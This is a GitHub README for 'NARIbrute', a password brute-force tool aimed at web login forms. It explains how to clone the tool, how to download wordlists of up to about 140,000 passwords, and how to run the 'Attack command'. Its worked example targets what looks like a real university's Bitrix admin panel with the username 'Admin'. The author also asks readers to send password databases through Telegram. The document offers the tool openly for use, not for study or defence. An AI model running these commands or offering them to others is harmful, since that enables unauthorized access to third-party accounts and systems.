<h1 align="center">Subscribe to my telegram<a href="https://t.me/samurai_figure" target="_blank">N∆RI</a> 
<img src="https://github.com/blackcater/blackcater/raw/main/images/Hi.gif" height="32"/></h1>
<h3 align="center">N∆RIbrute</h3>
<h3 align="center">Passwords are now ~ 29000</h3>
<img src="https://i.ibb.co/bJ0f863/Screenshot-2022-06-16-16-35-09-31-84d3000e3f4017145260f7618db1d683.jpg" alt="icon">
I will constantly update if you want to help throw password databases in my telegrams in .txt format @samurai_gh<br>
We can say that it is "universal" if the form of sending is as follows<br>
post login[username]<br>
post login[password]<br>
<h3 align="center">Installation:</h3><br>
Clone git<br>
 
```shell
git clone https://github.com/Samuraianonweb/NARIbrute
```
<br>
 
```shell
cd NARIbrute
```
<br>

Installation the password database (random 500 passwords) <br>
```
python2 baza_pass.py
```
Download a database of 10,000 passwords<br>
```
python2 full.py
```
Download the database 140991 passwords (unprocessed)<br>
```
python2 all.py
```
If you need to download the database by number (To sort the load on the machines) . All bases:https://github.com/Samuraianonweb/password<br>
The base id is the first digit (id) _500.txt<br>

```shell
python2 id_baza.py
```

```shell
Number Id? Enter the base number
```
<h3 align="center">Attack command:</h3>
 
```shell
python2 brute -url -login pass.txt 
```
-url = Panel / login link<br>
-login = Login (if known, if not insert Admin / admin)<br>
Examples of ready-made team <br>
```shell
python2 brute https://id.sechenov.ru/bitrix/admin Admin pass.txt
```
